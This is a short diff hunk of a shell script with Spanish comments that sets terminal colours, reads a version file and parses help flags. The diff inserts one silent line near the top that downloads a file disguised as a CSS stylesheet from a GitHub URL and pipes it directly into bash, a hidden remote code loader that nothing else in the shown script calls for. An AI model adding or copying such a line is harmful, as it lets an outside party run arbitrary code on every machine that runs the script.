@@ -3,6 +3,7 @@ touch /var/run/utmp #crea el archivo indicado para evitar que screen falle
 grisC="\033[0;37m"
 blanco="\033[1;37m"
 VERSION=`cat VERSION`
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
 then
 	echo -e $blanco
